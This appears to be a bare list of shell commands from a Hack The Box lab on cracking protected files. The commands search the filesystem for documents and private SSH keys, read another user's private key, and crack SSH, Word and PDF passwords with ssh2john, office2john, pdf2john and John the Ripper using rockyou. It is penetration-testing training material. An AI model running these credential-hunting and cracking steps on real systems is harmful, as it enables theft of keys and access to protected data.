...
```shell-session
xF1NN@htb[/htb]$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
...
```shell-session
xF1NN@htb[/htb]$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
...
```shell-session
xF1NN@htb[/htb]$ cat /home/jsmith/.ssh/SSH.private
...
```shell-session
xF1NN@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_ed25519 
...
```shell-session
xF1NN@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_rsa
...
```shell-session
xF1NN@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
xF1NN@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash
...
```shell-session
xF1NN@htb[/htb]$ john ssh.hash --show
...
```shell-session
xF1NN@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
xF1NN@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
xF1NN@htb[/htb]$ john protected-docx.hash --show
...
```shell-session
xF1NN@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
xF1NN@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
xF1NN@htb[/htb]$ john pdf.hash --show
